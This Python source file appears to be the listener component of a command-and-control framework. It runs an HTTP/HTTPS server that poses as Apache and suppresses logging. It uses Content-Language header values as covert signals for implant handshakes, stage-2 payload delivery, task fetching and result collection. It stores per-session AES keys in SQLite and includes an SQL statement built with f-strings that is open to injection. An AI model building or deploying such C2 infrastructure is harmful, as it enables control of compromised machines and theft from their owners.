from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import ssl
import sys
import sqlite3
import secrets
import eternalhush as eh
from additional.clingyspider import const, structs
import os
import json
import base64
import time

key_path = 0
http_port = 0
http_handler = None
session_list = {}
task_list = {} 

class DBWorker:
    def init_db(self):
        con = sqlite3.connect(eh.ui.GetGlobalEnv("OPERATION_PATH")+"/cs_sessions.db")
        cur = con.cursor()
        cur.execute("CREATE TABLE session_list(session_key, aes_key, aes_iv, console_id, last_seen)")
        con.commit()
        con.close()
        
    def load_db(self):
        con = sqlite3.connect(eh.ui.GetGlobalEnv("OPERATION_PATH")+"/cs_sessions.db")
        cur = con.cursor()
        for row in cur.execute("SELECT * FROM session_list").fetchall():
            t = eh.utils.Timer()
            t.set_time(row[4])
            session_list[row[0]] = {"key":row[1], "iv":row[2], "console_id":row[3], "watchdog":t} 
            task_list[row[0]] = dict()
            
        con.close()
        
    def update_db(self, session_key, aes_key, iv_key, console_id, last_seen):
        con = sqlite3.connect(eh.ui.GetGlobalEnv("OPERATION_PATH")+"/cs_sessions.db")
        cur = con.cursor()
        res = cur.execute("INSERT OR IGNORE INTO session_list (session_key, aes_key, aes_iv, console_id, last_seen) VALUES (?,?,?,?,?)", (session_key, aes_key, iv_key, console_id, last_seen))    
        res = cur.execute(f"UPDATE session_list SET aes_key='{aes_key}', aes_iv='{iv_key}', console_id={console_id}, last_seen={last_seen} WHERE session_key='{session_key}'")
        con.commit()
        con.close()

class HttpRequestHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.0"
    sys_version = "(Win32)"
    server_version = "Apache/2.4.58"
    db_worker = DBWorker()

    def log_message(self, format, *args):
        return

    def do_GET(self): #send
        global session_list
        global task_list
        global http_port
        global key_path

        self.task_list = task_list
        self.http_port = http_port
        self.key_path = key_path
        self.session_list = session_list

        if self.headers['Content-Language'] == "en-US":
            eh.ui.Echo("Called GET HELLO RESPONSE handler", eh.ECHO_DEFAULT, console_id = -1)
            http_handler.respond_NegotiationPhase(self)
            task_list = self.task_list
            session_list = self.session_list
        elif self.headers['Content-Language'] == "en-CA":
            eh.ui.Echo("Called GET STAGE2 INFO handler", eh.ECHO_DEFAULT, console_id = -1)
            if self.headers['Cookie'] not in session_list:
                http_handler.unknown_respond_handler(self)
                return
            http_handler.respond_Stage2Information(self)
            task_list = self.task_list
            session_list = self.session_list
        elif self.headers['Content-Language'] == "en-AU":
            eh.ui.Echo("Called LOAD STAGE2 handler", eh.ECHO_DEFAULT, console_id = -1)
            if self.headers['Cookie'] not in session_list:
                http_handler.unknown_respond_handler(self)
                return
            http_handler.respond_Stage2Object(self)
            task_list = self.task_list
            session_list = self.session_list
        elif self.headers['Content-Language'] == "en-NZ":
            eh.ui.Echo("Called GET TASK handler", eh.ECHO_DEFAULT, console_id = -1)
            if self.headers['Cookie'] not in session_list:
                http_handler.unknown_respond_handler(self)
                return
            http_handler.respond_FetchTask(self)
            task_list = self.task_list
            session_list = self.session_list
        elif self.path == "/fetch":
            eh.ui.Echo("Called GET TASK RESULT handler", eh.ECHO_DEFAULT, console_id = -1)
            if self.headers['Cookie'] not in session_list:
                http_handler.unknown_respond_handler(self)
                return
            http_handler.get_task_result(self, None)
            task_list = self.task_list
            session_list = self.session_list
        elif self.path == "/remove":
            eh.ui.Echo("Called GET REMOVE TASK handler", eh.ECHO_DEFAULT, console_id = -1)
            if self.headers['Cookie'] not in session_list:
                http_handler.unknown_respond_handler(self)
                return
            http_handler.remove_task(self, None)
            task_list = self.task_list
            session_list = self.session_list
        else:
            http_handler.unknown_respond_handler(self)

    def do_POST(self): #recv
        global session_list
        global task_list
        global http_port
        global key_path
        
        self.task_list = task_list
        self.http_port = http_port
        self.key_path = key_path
        self.session_list = session_list

        if self.headers['Content-Length'] != None:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
        elif self.headers['Transfer-Encoding'] != None:
            post_data = None
        else:
            http_handler.unknown_receive_handler(self)
            return

        if self.path == "/create":
            if self.headers['Cookie'] not in session_list:
                http_handler.unknown_receive_handler(self)
                return
            http_handler.add_new_task(self, post_data)
            task_list = self.task_list
            session_list = self.session_list

        elif self.headers['Content-Language'] == "en-NZ":
            eh.ui.Echo("Called POST TASK RESULT handler", eh.ECHO_DEFAULT, console_id = -1)
            if self.headers['Cookie'] not in session_list:
                http_handler.unknown_receive_handler(self)
                return
            http_handler.receive_FetchTask(self, post_data)
            task_list = self.task_list
            session_list = self.session_list

        elif self.headers['Content-Language'] == "en-US":
            eh.ui.Echo("Called HELLO handler", eh.ECHO_DEFAULT, console_id = -1)
            http_handler.receive_NegotiationPhase(self, post_data)
            task_list = self.task_list
            session_list = self.session_list
        else:
            http_handler.unknown_receive_handler(self)
            
class ThreadingHttpHandler(ThreadingMixIn, HTTPServer):
    pass
        
class HttpWebServer:
    def __init__(self):
        self.db_worker = DBWorker()

    def set_port(self, n):
        global http_port
        http_port = n    
    
    def set_keypath(self, n):
        global key_path
        key_path = n
   
    def set_handler(self, h):
        global http_handler
        http_handler = h

    def run(self):
            global http_port
            eh.ui.Echo("Starting HTTP server...", eh.ECHO_DEFAULT, console_id=-1)
            httpd = ThreadingHttpHandler(('0.0.0.0', http_port), HttpRequestHandler)
            try:
           #   httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
                httpd.serve_forever()
            except KeyboardInterrupt:
                httpd.server_close()
            
    
    def start(self):
        if not os.path.exists(eh.ui.GetGlobalEnv("OPERATION_PATH")+"/cs_sessions.db"):
            self.db_worker.init_db()
        self.db_worker.load_db()
        self.run()

class SslHttpWebServer(HttpWebServer):
    ssl_private_key = None
    ssl_public_cert = None


    def set_ssl_private_key(self, path):
        self.ssl_private_key = path

    def set_ssl_cert(self, path):
        self.ssl_public_cert = path

    def run(self):
            global http_port
            eh.ui.Echo("Starting SSL HTTP server...", eh.ECHO_DEFAULT, console_id=-1)
            httpd = ThreadingHttpHandler(('0.0.0.0', http_port), HttpRequestHandler)
            try:
                sslcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                sslcontext.load_cert_chain(keyfile=self.ssl_private_key, certfile=self.ssl_public_cert)
                httpd.socket = sslcontext.wrap_socket(httpd.socket, server_side=True)
                httpd.serve_forever()
            except KeyboardInterrupt:
                httpd.server_close()